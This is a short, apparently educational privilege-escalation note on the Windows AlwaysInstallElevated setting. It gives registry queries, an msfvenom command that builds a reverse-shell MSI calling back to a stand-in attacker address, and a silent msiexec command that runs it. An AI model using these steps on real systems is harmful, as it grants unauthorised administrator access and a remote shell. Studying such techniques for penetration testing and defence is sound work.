AlwaysInstallElevated:
Windows installer files (also known as .msi files) are used to install applications on the system. 
They usually run with the privilege level of the user that starts it. 
However, these can be configured to run with higher privileges from any user account (even unprivileged ones). 

This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below:
-C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
-C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

To be able to exploit this vulnerability, both should be set. 
Otherwise, exploitation will not be possible. 
If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. 

Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

-C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
